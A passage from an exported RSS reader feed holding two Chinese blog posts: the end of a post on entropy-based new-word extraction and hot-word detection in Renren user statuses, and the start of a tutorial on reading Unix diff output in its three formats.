。什么时候信息熵会更大呢？换句话说，发生了怎样的事件之后，你最想问一下它的结果如何？直觉上看，当然就是那些结果最不确定的事件。没错，信息熵直观地反映了一个事件的结果有多么的随机。</p>\n<p>    我们用信息熵来衡量一个文本片段的左邻字集合和右邻字集合有多随机。考虑这么一句话“吃葡萄不吐葡萄皮不吃葡萄倒吐葡萄皮”，“葡萄”一词出现了四次，其中左邻字分别为 {吃, 吐, 吃, 吐} ，右邻字分别为 {不, 皮, 倒, 皮} 。根据公式，“葡萄”一词的左邻字的信息熵为 - (1/2) · log(1/2) - (1/2) · log(1/2) ≈ 0.693 ，它的右邻字的信息熵则为 - (1/2) · log(1/2) - (1/4) · log(1/4) - (1/4) · log(1/4) ≈ 1.04 。可见，在这个句子中，“葡萄”一词的右邻字更加丰富一些。</p>\n<p>    在人人网用户状态中，“被子”一词一共出现了 956 次，“辈子”一词一共出现了 2330 次，两者的右邻字集合的信息熵分别为 3.87404 和 4.11644 ，数值上非常接近。但“被子”的左邻字用例非常丰富：用得最多的是“晒被子”，它一共出现了 162 次；其次是“的被子”，出现了 85 次；接下来分别是“条被子”、“在被子”、“床被子”，分别出现了 69 次、 64 次和 52 次；当然，还有“叠被子”、“盖被子”、“加被子”、“新被子”、“掀被子”、“收被子”、“薄被子”、“踢被子”、“抢被子”等 100 多种不同的用法构成的长尾⋯⋯所有左邻字的信息熵为 3.67453 。但“辈子”的左邻字就很可怜了， 2330 个“辈子”中有 1276 个是“一辈子”，有 596 个“这辈子”，有 235 个“下辈子”，有 149 个“上辈子”，有 32 个“半辈子”，有 10 个“八辈子”，有 7 个“几辈子”，有 6 个“哪辈子”，以及“n 辈子”、“两辈子”等 13 种更罕见的用法。所有左邻字的信息熵仅为 1.25963 。因而，“辈子”能否成词，明显就有争议了。“下子”则是更典型的例子， 310 个“下子”的用例中有 294 个出自“一下子”， 5 个出自“两下子”， 5 个出自“这下子”，其余的都是只出现过一次的罕见用法。事实上，“下子”的左邻字信息熵仅为 0.294421 ，我们不应该把它看作一个能灵活运用的词。当然，一些文本片段的左邻字没啥问题，右邻字用例却非常贫乏，例如“交响”、“后遗”、“鹅卵”等，把它们看作单独的词似乎也不太合适。我们不妨就把一个文本片段的自由运用程度定义为它的左邻字信息熵和右邻字信息熵中的较小值。</p>\n<p> <br>\n    在实际运用中你会发现，文本片段的凝固程度和自由程度，两种判断标准缺一不可。只看凝固程度的话，程序会找出“巧克”、“俄罗”、“颜六色”、“柴可夫”等实际上是“半个词”的片段；只看自由程度的话，程序则会把“吃了一顿”、“看了一遍”、“睡了一晚”、“去了一趟”中的“了一”提取出来，因为它的左右邻字都太丰富了。</p>\n<p> <br>\n <br>\n    我们把文本中出现过的所有长度不超过 d 的子串都当作潜在的词（即候选词，其中 d 为自己设定的候选词长度上限，我设定的值为 5 ），再为出现频数、凝固程度和自由程度各设定一个阈值，然后只需要提取出所有满足阈值要求的候选词即可。为了提高效率，我们可以把语料全文视作一整个字符串，并对该字符串的所有后缀按字典序排序。下表就是对“四是四十是十十四是十四四十是四十”的所有后缀进行排序后的结果。实际上我们只需要在内存中存储这些后缀的前 d + 1 个字，或者更好地，只储存它们在语料中的起始位置。</p>\n<blockquote><p>十<br>\n十十四是十四四十是四十<br>\n十是十十四是十四四十是四十<br>\n十是四十<br>\n十四是十四四十是四十<br>\n十四四十是四十<br>\n是十十四是十四四十是四十<br>\n是十四四十是四十<br>\n是四十<br>\n是四十是十十四是十四四十是四十<br>\n四十<br>\n四十是十十四是十四四十是四十<br>\n四十是四十<br>\n四是十四四十是四十<br>\n四是四十是十十四是十四四十是四十<br>\n四四十是四十</p></blockquote>\n<p>    这样的话，相同的候选词便都集中在了一起，从头到尾扫描一遍便能算出各个候选词的频数和右邻字信息熵。将整个语料逆序后重新排列所有的后缀，再扫描一遍后便能统计出每个候选词的左邻字信息熵。另外，有了频数信息后，凝固程度也都很好计算了。这样，我们便得到了一个无需任何知识库的抽词算法，输入一段充分长的文本，这个算法能以大致 O(n · logn) 的效率提取出可能的词来。</p>\n<p> <br>\n    对不同的语料进行抽词，并且按这些词的频数从高到低排序。你会发现，不同文本的用词特征是非常明显的。下面是对《西游记》上册的抽词结果：</p>\n<blockquote><p>行者、师父、三藏、八戒、大圣、菩萨、悟空、怎么、和尚、唐僧、老孙、溃骸、什么、沙僧、太宗、徒弟、袈裟、妖精、玉帝、今日、兄弟、公主、玄奘、陛下、宝贝、性命、晓得、门外、妖魔、光蕊、观音、花果山、土地、木叉、东土、变化、变做、伯钦、判官、多少、真君、齐天大圣、蟠桃、丞相、魏征、扯住、溃骸澳、抬头、揭谛、言语、猪八戒、兵器、吩咐、安排、叩头、清风、哪吒、左右、美猴王、钉钯、孩儿、女婿、金箍棒、二郎、东西、许多、奈何、人参果、收拾、近前、太保、明月、南海、水帘洞、门首、弼马温、李天王⋯⋯</p></blockquote>\n<p>    《资本论》全文：</p>\n<blockquote><p> 商品、形式、货币、我们、过程、自己、机器、社会、部分、表现、没有、流通、需要、增加、已经、交换、关系、先令、积累、必须、英国、条件、发展、麻布、儿童、进行、提高、消费、减少、任何、手段、职能、土地、特殊、实际、完全、平均、直接、随着、简单、规律、市场、增长、上衣、决定、什么、制度、最后、支付、许多、虽然、棉纱、形态、棉花、法律、绝对、提供、扩大、独立、世纪、性质、假定、每天、包含、物质、家庭、规模、考察、剥削、经济学、甚至、延长、财富、纺纱、购买、开始、代替、便士、怎样、降低、能够、原料、等价物⋯⋯</p></blockquote>\n<p>    《圣经》全文：</p>\n<blockquote><p> 以色列、没有、自己、一切、面前、大卫、知道、什么、犹大、祭司、摩西、看见、百姓、吩咐、埃及、听见、弟兄、告诉、基督、已经、先知、扫罗、父亲、雅各、永远、攻击、智慧、荣耀、临到、洁净、离开、怎样、平安、律法、支派、许多、门徒、打发、好像、仇敌、原文作、名叫、巴比伦、今日、首领、旷野、所罗门、约瑟、两个、燔祭、法老、衣服、脱离、二十、公义、审判、十二、亚伯拉罕、石头、聚集、按着、祷告、罪孽、约书亚、事奉、指着、城邑、进入、彼此、建造、保罗、应当、摩押、圣灵、惧怕、应许、如今、帮助、牲畜⋯⋯</p></blockquote>\n<p>    《时间简史》全文：</p>\n<blockquote><p>黑洞、必须、非常、任何、膨胀、科学、预言、太阳、观察、定律、运动、事件、奇点、坍缩、问题、模型、方向、区域、知道、开始、辐射、部分、牛顿、产生、夸克、无限、轨道、解释、边界、甚至、自己、类似、描述、最终、旋转、爱因斯坦、绕着、什么、效应、表明、温度、研究、收缩、吸引、按照、完全、增加、开端、基本、计算、结构、上帝、进行、已经、发展、几乎、仍然、足够、影响、初始、科学家、事件视界、第二、改变、历史、世界、包含、准确、证明、导致、需要、应该、至少、刚好、提供、通过、似乎、继续、实验、复杂、伽利略⋯⋯</p></blockquote>\n<p>    哦，对了，还有我最喜欢的，《人民日报》 2000 年 4 月新闻版的抽词结果：</p>\n<blockquote><p>发展、我们、经济、主席、江泽民、领导、建设、关系、教育、干部、企业、问题、主义、政治、群众、改革、政府、思想、加强、台湾、地区、北京、总统、世界、记者、代表、民族、组织、历史、访问、原则、努力、管理、今天、技术、市场、世纪、坚持、社会主义、财政、江泽民主席、增长、积极、精神、同志、双方、自己、友好、领导干部、进一步、基础、提高、必须、不断、制度、政策、解决、取得、表示、活动、支持、通过、研究、没有、学习、稳定、举行、欢迎、农村、生活、促进、科技、投资、科学、环境、领域、公司、情况、充分⋯⋯</p></blockquote>\n<p>    当然，我也没有忘记对人人网用户状态进行分析——人人网用户状态中最常出现的词是：</p>\n<blockquote><p> 哈哈、什么、今天、怎么、现在、可以、知道、喜欢、终于、这样、觉得、因为、如果、感觉、开始、回家、考试、老师、幸福、朋友、时间、发现、东西、快乐、为什么、睡觉、生活、已经、希望、最后、各种、状态、世界、突然、手机、其实、那些、同学、孩子、尼玛、木有、然后、以后、学校、所以、青年、晚安、原来、电话、加油、果然、学习、中国、最近、应该、需要、居然、事情、永远、特别、北京、他妈、伤不起、必须、呵呵、月亮、毕业、问题、谢谢、英语、生日快乐、工作、虽然、讨厌、给力、容易、上课、作业、今晚、继续、努力、有木有、记得⋯⋯</p></blockquote>\n<p>    事实上，程序从人人网的状态数据中一共抽出了大约 1200 个词，里面大多数词也确实都是标准的现代汉语词汇。不过别忘了，我们的目标是新词抽取。将所有抽出来的词与已有词库作对比，于是得到了人人网特有的词汇（同样按频数从高到低排序）：</p>\n<blockquote><p>尼玛、伤不起、给力、有木有、挂科、坑爹、神马、淡定、老爸、卧槽、牛逼、肿么、苦逼、无语、微博、六级、高数、选课、悲催、基友、蛋疼、很久、人人网、情何以堪、童鞋、哇咔咔、脑残、吐槽、猥琐、奶茶、我勒个去、刷屏、妹纸、胃疼、飘过、考研、弱爆了、太准了、搞基、忽悠、羡慕嫉妒恨、手贱、柯南、狗血、秒杀、装逼、真特么、碎觉、奥特曼、内牛满面、斗地主、腾讯、灰常、偶遇、拉拉、屌丝、九把刀、高富帅、阿内尔卡、魔兽世界、线代、三国杀、林俊杰、速速、臭美、花痴⋯⋯</p></blockquote>\n<p> <br>\n    我还想到了更有意思的玩法。为什么不拿每一天状态里的词去和前一天的状态作对比，从而提取出这一天里特有的词呢？这样一来，我们就能从人人网的用户状态中提取出每日热点了！从手里的数据规模看，这是完全有可能的。我选了 12 个比较具有代表性的词，并列出了它们在 2011 年 12 月 13 日的用户状态中出现的频数（左列的数），以及 2011 年 12 月 14 日的用户状态中出现的频数（右列的数）：</p>\n<blockquote><table>\n<tr>\n<td style=\"width:80px\">下雪</td>\n<td style=\"width:60px\">33</td>\n<td style=\"width:60px\">92</td>\n</tr>\n<tr>\n<td>那些年</td>\n<td>139</td>\n<td>146</td>\n</tr>\n<tr>\n<td>李宇春</td>\n<td>1</td>\n<td>4</td>\n</tr>\n<tr>\n<td>看见</td>\n<td>145</td>\n<td>695</td>\n</tr>\n<tr>\n<td>魔兽</td>\n<td>23</td>\n<td>20</td>\n</tr>\n<tr>\n<td>高数</td>\n<td>82</td>\n<td>83</td>\n</tr>\n<tr>\n<td>生日快乐</td>\n<td>235</td>\n<td>210</td>\n</tr>\n<tr>\n<td>今天</td>\n<td>1416</td>\n<td>1562</td>\n</tr>\n<tr>\n<td>北半球</td>\n<td>2</td>\n<td>18</td>\n</tr>\n<tr>\n<td>脖子</td>\n<td>23</td>\n<td>69</td>\n</tr>\n<tr>\n<td>悲伤</td>\n<td>61</td>\n<td>33</td>\n</tr>\n<tr>\n<td>电磁炉</td>\n<td>0</td>\n<td>3</td>\n</tr>\n</table>\n</blockquote>\n<p>    大家可以从直觉上迅速判断出，哪些词可以算作是 12 月 14 日的热词。比方说，“下雪”一词在 12 月 13 日只出现了 33 次，在 12 月 14 日却出现了 92 次，后者是前者的 2.8 倍，这不大可能是巧合，初步判断一定是 12 月 14 日真的有什么地方下雪了。“那些年”在 12 月 14 日的频数确实比 12 月 13 日更多，但相差并不大，我们没有理由认为它是当日的一个热词。</p>\n<p>    一个问题摆在了我们面前：我们如何去量化一个词的“当日热度”？第一想法当然是简单地看一看每个词的当日频数和昨日频数之间的倍数关系，不过细想一下你就发现问题了：它不能解决样本过少带来的偶然性。 12 月 14 日“李宇春”一词的出现频数是 12 月 13 日的 4 倍，这超过了“下雪”一词的 2.8 倍，但我们却更愿意相信“李宇春”的现象只是一个偶然。更麻烦的则是“电磁炉”一行， 12 月 14 日的频数是 12 月 13 日的无穷多倍，但显然我们也不能因此就认为“电磁炉”是 12 月 14 日最热的词。</p>\n<p>    忽略所有样本过少的词？这似乎也不太好，样本少的词也有可能真的是热词。比如“北半球”一词，虽然它在两天里的频数都很少，但这个 9 倍的关系确实不容忽视。事实上，人眼很容易看出哪些词真的是 12 月 14 日的热词：除了“下雪”以外，“看见”、“北半球”和“脖子”也应该是热词。你或许坚信后三个词异峰突起的背后一定有什么原因（并且迫切地想知道这个原因究竟是什么），但却会果断地把“李宇春”和“电磁炉”这两个“异常”归结为偶然原因。你的直觉是对的—— 2011 年 12 月 14 日发生了极其壮观的双子座流星雨，此乃北半球三大流星雨之一。白天网友们不断转发新闻，因而“北半球”一词热了起来；晚上网友们不断发消息说“看见了”、“又看见了”，“看见”一词的出现频数猛增；最后呢，仰望天空一晚上，脖子终于出毛病了，于是回家路上一个劲儿地发“脖子难受”。</p>\n<p>    让计算机也能聪明地排除偶然因素，这是我们在数据挖掘过程中经常遇到的问题。我们经常需要对样本过少的项目进行“平滑”操作，以避免分母过小带来的奇点。这里，我采用的是一个非常容易理解的方法：一个词的样本太少，就给这个词的热度打折扣。为了便于说明，我们选出四个词为例来分析。</p>\n<p>    下表截取了前四个词，右边四列分别表示各词在 12 月 13 日出现的频数，在 12 月 14 日出现的频数，在两天里一共出现的总频数，以及后一天的频数所占的比重。第三列数字是前两列数字之和，第四列数字则是第二列数字除以第三列数字的结果。最后一列应该是一个 0 到 1 之间的数，它表明对应的词有多大概率出现在了 12 月 14 日这一天。最后一列可以看作是各词的得分。可以看到，此时“下雪”的得分低于“李宇春”，这是我们不希望看到的结果。“李宇春”的样本太少，我们想以此为缘由把它的得分拖下去。</p>\n<blockquote><table>\n<tr>\n<td style=\"width:80px\">下雪</td>\n<td style=\"width:60px\">33</td>\n<td style=\"width:60px\">92</td>\n<td style=\"width:60px\">125</td>\n<td style=\"width:60px\">0.736</td>\n</tr>\n<tr>\n<td>那些年</td>\n<td>139</td>\n<td>146</td>\n<td>285</td>\n<td>0.512</td>\n</tr>\n<tr>\n<td>李宇春</td>\n<td>1</td>\n<td>4</td>\n<td>5</td>\n<td>0.8</td>\n</tr>\n<tr>\n<td>看见</td>\n<td>145</td>\n<td>695</td>\n<td>840</td>\n<td>0.827</td>\n</tr>\n<tr>\n<td>（平均）</td>\n<td></td>\n<td></td>\n<td>313.75</td>\n<td>0.719</td>\n</tr>\n</table>\n</blockquote>\n<p>    怎么做呢？我们把每个词的得分都和全局平均分取一个加权平均！首先计算出这四个词的平均总频数，为 313.75 ；再计算出这四个词的平均得分，为 0.719 。接下来，我们假设已经有 313.75 个人预先给每个词都打了 0.719 分，换句话说每个词都已经收到了 313.75 次评分，并且所有这 313.75 个评分都是 0.719 分。“下雪”这个词则还有额外的 125 个人评分，其中每个人都给了 0.736 分。因此，“下雪”一词的最终得分就是：</p>\n<blockquote><table>\n<tr>\n<td style=\"width:80px\">下雪</td>\n<td>(0.736 × 125 + 0.719 × 313.75) / (125 + 313.75) ≈ 0.724</td>\n</tr>\n</table>\n</blockquote>\n<p>    类似地，其他几个词的得分依次为：</p>\n<blockquote><table>\n<tr>\n<td style=\"width:80px\">那些年</td>\n<td>(0.512 × 285 + 0.719 × 313.75) / (285 + 313.75) ≈ 0.62</td>\n</tr>\n<tr>\n<td>李宇春</td>\n<td>(0.8 × 5 + 0.719 × 313.75) / (5 + 313.75) ≈ 0.7202</td>\n</tr>\n<tr>\n<td>看见</td>\n<td>(0.827 × 840 + 0.719 × 313.75) / (840 + 313.75) ≈ 0.798</td>\n</tr>\n</table>\n</blockquote>\n<p>    容易看出，此时样本越大的词，就越有能力把最终得分拉向自己本来的得分，样本太小的词，最终得分将会与全局平均分非常接近。经过这么一番调整，“下雪”一词的得分便高于了“李宇春”。实际运用中， 313.75 这个数也可以由你自己来定，定得越高就表明你越在意样本过少带来的负面影响。这种与全局平均取加权平均的思想叫做 Bayesian average ，从上面的若干式子里很容易看出，它实际上是最常见的平滑处理方法之一——分子分母都加上一个常数——的一种特殊形式。</p>\n<p>    利用之前的抽词程序抽取出人人网每一天内用户状态所含的词，把它们的频数都与前一天的作对比，再利用刚才的方法加以平滑，便能得出每一天的热词了。我手上的数据是人人网 2011 年 12 月上半月的数据，因此我可以得出从 12 月 2 日到 12 月 15 日的热词（选取每日前 5 名，按得分从高到低）。</p>\n<blockquote><p>2011-12-02：第一场雪、北京、金隅、周末、新疆<br>\n2011-12-03：荷兰、葡萄牙、死亡之组、欧洲杯、德国<br>\n2011-12-04：那些年、宣传、期末、男朋友、升旗<br>\n2011-12-05：教室、老师、视帝、体育课、质量<br>\n2011-12-06：乔尔、星期二、摄影、经济、音乐<br>\n2011-12-07：陈超、星巴克、优秀、童鞋、投票<br>\n2011-12-08：曼联、曼城、欧联杯、皇马、冻死<br>\n2011-12-09：保罗、月全食、交易、火箭、黄蜂<br>\n2011-12-10：变身、罗伊、穿越、皇马、巴萨<br>\n2011-12-11：皇马、巴萨、卡卡、梅西、下半场<br>\n2011-12-12：淘宝、阿内尔卡、双十二、申花、老师<br>\n2011-12-13：南京、南京大屠杀、勿忘国耻、默哀、警报<br>\n2011-12-14：流星雨、许愿、愿望、情人节、几颗<br>\n2011-12-15：快船、保罗、巴萨、昨晚、龙门飞甲 </p></blockquote>\n<p>    看来， 12 月 14 日果然有流星雨发生。</p>\n<p>    注意，由于我们仅仅对比了相邻两天的状态，因而产生了个别实际上是由工作日/休息日的区别造成的“热词”，比如“教室”、“老师”、“星期二”等。把这样的词当作热词可能并不太妥。结合上周同日的数据，或者干脆直接与之前整个一周的数据来对比，或许可以部分地解决这一问题。</p>\n<p>    事实上，有了上述工具，我们可以任意比较两段不同文本中的用词特点。更有趣的是，人人网状态的大多数发布者都填写了性别和年龄的个人信息，我们为何不把状态重新分成男性和女性两组，或者 80 后和 90 后两组，挖掘出不同属性的人都爱说什么？要知道，在过去，这样的问题需要进行大规模语言统计调查才能回答！然而，在互联网海量用户生成内容的支持下，我们可以轻而易举地挖掘出答案来。</p>\n<p>    我真的做了这个工作（基于另一段日期内的数据）。男性爱说的词有：</p>\n<blockquote><p>兄弟、篮球、男篮、米兰、曼联、足球、蛋疼、皇马、比赛、国足、超级杯、球迷、中国、老婆、政府、航母、踢球、赛季、股市、砸蛋、牛逼、铁道部、媳妇、国际、美国、连败、魔兽、斯内德、红十字、经济、腐败、程序、郭美美、英雄、民主、鸟巢、米兰德比、官员、内涵、历史、训练、评级、金融、体育、记者、事故、程序员、媒体、投资、事件、社会、项目、伊布、主义、决赛、操蛋、纳尼、领导、喝酒、民族、新闻、言论、和谐、农民、体制、城管⋯⋯</p></blockquote>\n<p>    下面则是女性爱说的词：</p>\n<blockquote><p>一起玩、蛋糕、加好友、老公、呜呜、姐姐、嘻嘻、老虎、讨厌、妈妈、呜呜呜、啦啦啦、便宜、减肥、男朋友、老娘、逛街、无限、帅哥、礼物、互相、奶茶、委屈、各种、高跟鞋、指甲、城市猎人、闺蜜、巧克力、第二、爸爸、宠物、箱子、吼吼、大黄蜂、狮子、胃疼、玫瑰、包包、裙子、游戏、遇见、嘿嘿、灰常、眼睛、各位、妈咪、化妆、玫瑰花、蓝精灵、幸福、陪我玩、任务、怨念、舍不得、害怕、狗狗、眼泪、温暖、面膜、收藏、李民浩、神经、土豆、零食、痘痘、戒指、巨蟹、晒黑⋯⋯</p></blockquote>\n<p>    下面是 90 后用户爱用的词：</p>\n<blockquote><p>加好友、作业、各种、乖乖、蛋糕、来访、卧槽、通知书、麻将、聚会、补课、欢乐、刷屏、录取、无限、互相、速度、一起玩、啦啦啦、晚安、求陪同、基友、美女、矮油、巨蟹、五月天、第二、唱歌、老虎、扣扣、啧啧、帅哥、哈哈哈、尼玛、便宜、苦逼、斯内普、写作业、劳资、孩纸、哎哟、炎亚纶、箱子、无聊、求来访、查分、上课、果断、处女、首映、屏蔽、混蛋、暑假、吓死、新东方、组队、下学期、陪我玩、打雷、妹纸、水瓶、射手、搞基、吐槽、同学聚会、出去玩、呜呜、白羊、表白、做作业、签名、姐姐、停机、伏地魔、对象、哈哈、主页、情侣、无压力、共同、摩羯、碎觉、肿么办⋯⋯</p></blockquote>\n<p>    下面则是 80 后用户爱用的词：</p>\n<blockquote><p>加班、培训、周末、工作、公司、各位、值班、砸蛋、上班、任务、公务员、工资、领导、包包、办公室、校内、郭美美、时尚、企业、股市、新号码、英国、常联系、实验室、论文、忙碌、项目、部门、祈福、邀请、招聘、顺利、朋友、红十字、男朋友、媒体、产品、标准、号码、存钱、牛仔裤、曼联、政府、简单、立秋、事故、伯明翰、博士、辞职、健康、销售、深圳、奶茶、搬家、实验、投资、节日快乐、坚持、规则、考验、生活、体制、客户、发工资、忽悠、提供、教育、处理、惠存、沟通、团购、缺乏、腐败、启程、红十字会、结婚、管理、环境、暴跌、服务、变形金刚、祝福、银行⋯⋯</p></blockquote>\n<p>    不仅如此，不少状态还带有地理位置信息，因而我们可以站在空间的维度对信息进行观察。这个地方的人都爱说些什么？爱说这个词的人都分布在哪里？借助这些包含地理位置的签到信息，我们也能挖掘出很多有意思的结果来。例如，对北京用户的签到信息进行抽词，然后对于每一个抽出来的词，筛选出所有包含该词的签到信息并按地理坐标的位置聚类，这样我们便能找出那些地理分布最集中的词。结果非常有趣：“考试”一词集中分布在海淀众高校区，“天津”一词集中出现在北京南站，“逛街”一词则全都在西单附近扎堆。北京首都国际机场也是一个非常特别的地点，“北京”、“登机”、“终于”、“再见”等词在这里出现的密度极高。</p>\n<p>    从全国范围来看，不同区域的人也有明显的用词区别。我们可以将全国地图划分成网格，统计出所有签到信息在各个小格内出现的频数，作为标准分布；然后对于每一个抽出来的词，统计出包含该词的签到信息在各个小格内出现的频数，并与标准分布进行对比（可以采用余弦距离等公式），从而找出那些分布最反常的词。程序运行后发现，这样的词还真不少。一些明显具有南北差异的词，分布就会与整个背景相差甚远。例如，在节假日的时候，“滑雪”一词主要在北方出现，“登山”一词则主要在南方出现。地方特色也是造成词语分布差异的一大原因，例如“三里屯”一词几乎只在北京出现，“热干面”一词集中出现在武汉地区，“地铁”一词明显只有个别城市有所涉及。这种由当地人的用词特征反映出来的真实的地方特色，很可能是许多旅游爱好者梦寐以求的信息。另外，方言也会导致用词分布差异，例如“咋这么”主要分布在北方地区，“搞不懂”主要分布在南方城市，“伐”则非常集中地出现在上海地区。当数据规模足够大时，或许我们能通过计算的方法，自动对中国的方言区进行划分。</p>\n<p>    其实，不仅仅是发布时间、用户年龄、用户性别、地理位置这四个维度，我们还可以对浏览器、用户职业、用户活跃度、用户行为偏好等各种各样的维度进行分析，甚至可以综合考虑以上维度，在某个特定范围内挖掘热点事件，或者根据语言习惯去寻找出某个特定的人群。或许这听上去太过理想化，不过我坚信，有了合适的算法，这些想法终究会被一一实现。</p><img src=\"http://www1.feedsky.com/t1/701323821/matrix67/feedsky/s.gif?r=http://www.matrix67.com/blog/archives/5044\" border=\"0\" height=\"0\" width=\"0\">"
    },
    "author" : "Matrix67",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.matrix67.com/blog/feed.asp",
      "title" : "Matrix67: My Blog",
      "htmlUrl" : "http://www.matrix67.com/blog"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1346380529803",
    "timestampUsec" : "1346380529803736",
    "id" : "tag:google.com,2005:reader/item/8dc0e91ae3613edb",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "IT" ],
    "title" : "读懂diff",
    "published" : 1346239207,
    "updated" : 1346239207,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2012/08/how_to_read_diff.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>diff是Unix系统的一个很重要的工具程序。</p><p>它用来比较两个文本文件的差异，是代码版本管理的基石之一。你在命令行下，输入：</p>\n\n<blockquote>\n\n<p>　　$ diff &lt;变动前的文件&gt;  &lt;变动后的文件&gt;</p>\n\n</blockquote>\n\n<p>diff就会告诉你，这两个文件有何差异。它的显示结果不太好懂，下面我就来说明，如何读懂diff。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201208/bg2012082901.png\"></p>\n\n<p><strong>一、diff的三种格式</strong></p>\n\n<p>由于历史原因，diff有三种格式：</p>\n\n<blockquote>\n\n<p>　　* 正常格式（normal diff）</p>\n\n<p>　　* 上下文格式（context diff）</p>\n\n<p>　　* 合并格式（unified diff）</p>\n\n</blockquote>\n\n<p>我们依次来看。</p>\n\n<p><strong>二、示例文件</strong></p>\n\n<p>为了便于讲解，先新建两个示例文件。</p>\n\n<p>第一个文件叫做f1，内容是每行一个a，一共7行。</p>\n\n<blockquote>\n\n<p>　　a<br>\n　　a<br>\n　　a<br>\n　　a<br>\n　　a<br>\n　　a<br>\n　　a</p>\n\n</blockquote>\n\n<p>第二个文件叫做f2，修改f1而成，第4行变成b，其他不变。</p>\n\n<blockquote>\n\n<p>　　a<br>\n　　a<br>\n　　a<br>\n　　<strong>b</strong><br>\n　　a<br>\n　　a<br>\n　　a</p>\n\n</blockquote>\n\n<p><strong>三、正常格式的diff</strong></p>\n\n<p>现在对f1和f2进行比较：</p>\n\n<blockquote>\n\n<p>　　$ diff f1 f2</p>\n\n</blockquote>\n\n<p>这时，diff就会显示正常格式的结果：</p>\n\n<blockquote>\n\n<p>　　4c4<br>\n　　&lt; a<br>\n　　---<br>\n　　&gt; b</p>\n\n</blockquote>\n\n<p>第一行是一个提示，用来说明变动位置。</p>\n\n<blockquote>\n\n<p>　　4c4</p>\n\n</blockquote>\n\n<p>它分成三个部分：前面的\"4\"，表示f1的第4行有变化；中间的\"c\"表示变动的模式是内容改变（change），其他模式还有\"增加\"（a，代表addition）和\"删除\"（d，代表deletion）；后面的\"4\"，表示变动后变成f2的第4行。</p>\n\n<p>第二行分成两个部分。</p>\n\n<blockquote>\n\n<p>　　&lt; a</p>\n\n</blockquote>\n\n<p>前面的小于号，表示要从f1当中去除该行（也就是第4行），后面的\"a\"表示该行的内容。</p>\n\n<p>第三行用来分割f1和f2。</p>\n\n<blockquote>\n\n<p>　　---</p>\n\n</blockquote>\n\n<p>第四行，类似于第二行。</p>\n\n<blockquote>\n\n<p>　　&gt; b</p>\n\n</blockquote>\n\n<p>前面的大于号表示f2增加了该行，后面的\"b\"表示该行的内容。</p>\n\n<p>最早的<a href=\"http://www.ruanyifeng.com/blog/2010/03/unix_copyright_history.html\">Unix</a>（即AT&amp;T版本的Unix），使用的就是这种格式的diff。</p>\n\n<p><strong>四、上下文格式的diff</strong></p>\n\n<p>上个世纪80年代初，加州大学伯克利分校推出BSD版本的Unix时，觉得diff的显示结果太简单，最好加入上下文，便于了解发生的变动。因此，推出了上下文格式的diff。</p>\n\n<p>它的使用方法是加入c参数（代表context）。</p>\n\n<blockquote>\n\n<p>　　$ diff -c f1 f2</p>\n\n</blockquote>\n\n<p>显示结果如下：</p>\n\n<blockquote>\n\n<p>　　*** f1\t2012-08-29 16:45:41.000000000 +0800<br>\n　　--- f2\t2012-08-29 16:45:51.000000000 +0800<br>\n　　***************<br>\n　　*** 1,7 ****<br>\n　　  a<br>\n　　  a<br>\n　　  a<br>\n　　!a<br>\n　　  a<br>\n　　  a<br>\n　　  a<br>\n　　--- 1,7 ----<br>\n　　  a<br>\n　　  a<br>\n　　  a<br>\n　　!b<br>\n　　  a<br>\n　　  a<br>\n　　  a</p>\n\n</blockquote>\n\n<p>这个结果分成四个部分。</p>\n\n<p>第一部分的两行，显示两个文件的基本情况：文件名和时间信息。</p>\n\n<blockquote>\n\n<p>　　*** f1\t2012-08-29 16:45:41.000000000 +0800<br>\n　　--- f2\t2012-08-29 16:45:51.000000000 +0800</p>\n\n</blockquote>\n\n<p>\"***\"表示变动前的文件，\"---\"表示变动后的文件。</p>\n\n<p>第二部分是15个星号，将文件的基本情况与变动内容分割开。</p>\n\n<blockquote>\n\n<p>　　***************</p>\n\n</blockquote>\n\n<p>第三部分显示变动前的文件，即f1。</p>\n\n<blockquote>\n\n<p>　　*** 1,7 ****<br>\n　　  a<br>\n　　  a<br>\n　　  a<br>\n　　!a<br>\n　　  a<br>\n　　  a<br>\n　　  a</p>\n\n</blockquote>\n\n<p>这时不仅显示发生变化的第4行，还显示第4行的前面三行和后面三行，因此一共显示7行。所以，前面的\"*** 1,7 ****\"就表示，从第1行开始连续7行。</p>\n\n<p>另外，文件内容的每一行最前面，还有一个标记位。如果为空，表示该行无变化；如果是感叹号（!），表示该行有改动；如果是减号（-），表示该行被删除；如果是加号（+），表示该行为新增。</p>\n\n<p>第四部分显示变动后的文件，即f2。</p>\n\n<blockquote>\n\n<p>　　--- 1,7 ----<br>\n　　  a<br>\n　　  a<br>\n　　  a<br>\n　　!b<br>\n　　  a<br>\n　　  a<br>\n　　  a</p>\n\n</blockquote>\n\n<p>除了变动行（第4行）以外，也是上下文各显示三行，总共显示7行。</p>\n\n<p><strong>五、合并格式的diff</strong></p>\n\n<p>如果两个文件相似度很高，那么上下文格式的diff，将显示大量重复的内容，很浪费空间。1990年，GNU diff率先推出了\"合并格式\"的diff，将f1和f2的上下文合并在一起显示。</p>\n\n<p>它的使用方法是加入u参数（代表unified）。</p>\n\n<blockquote>\n\n<p>　　$ diff -u f1 f2</p>\n\n</blockquote>\n\n<p>显示结果如下：</p>\n\n<blockquote>\n\n<p>　　--- f1\t2012-08-29 16:45:41.000000000 +0800<br>\n　　+++ f2\t2012-08-29 16:45:51.000000000 +0800<br>\n　　@@ -1,7 +1,7 @@<br>\n　　 a<br>\n　　 a<br>\n　　 a<br>\n　　-a<br>\n　　+b<br>\n　　 a<br>\n　　 a<br>\n　　 a</p>\n\n</blockquote>\n\n<p>它的第一部分，也是文件的基本信息。</p>\n\n<blockquote>\n\n<p>　　--- f1\t2012-08-29 16:45:41.000000000 +0800<br>\n　　+++ f2\t2012-08-29 16:45:51.000000000 +0800</p>\n\n</blockquote>\n\n<p>\"---\"表示变动前的文件，\"+++\"表示变动后的文件。</p>\n\n<p>第二部分，变动的位置用两个@作为起首和结束。</p>\n\n<blockquote>\n\n<p>　　@@ -1,7 +1,7 